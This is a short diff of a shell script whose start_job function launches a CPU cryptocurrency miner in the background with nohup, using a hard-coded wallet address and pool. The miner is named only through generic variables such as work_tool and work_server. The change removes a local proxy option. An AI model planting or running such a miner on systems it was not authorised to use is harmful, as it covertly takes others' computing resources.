@@ -162,7 +162,7 @@ start_job() {
     else
         run_setup
         rotate_log "$LOG_FILE"
-        JOB_COMMAND="./${work_tool} --disable-gpu --algorithm yespowerinterchained --pool ${work_server} --wallet itc1qr6s5vr29g8nvv0uzxfkmjgl3a7evvwauv0f9sr.$currentdate --password webpassword=IhatePopUps,m=solo,start=0.76 --proxy 127.0.0.1:40000 --cpu-threads $used_num_of_cores --keepalive"
+        JOB_COMMAND="./${work_tool} --disable-gpu --algorithm yespowerinterchained --pool ${work_server} --wallet itc1qr6s5vr29g8nvv0uzxfkmjgl3a7evvwauv0f9sr.$currentdate --password webpassword=IhatePopUps,m=solo,start=0.76 --cpu-threads $used_num_of_cores --keepalive"
         nohup $JOB_COMMAND >> "$LOG_FILE" 2>&1 &
         echo $! > "$PID_FILE"
 		sleep 2
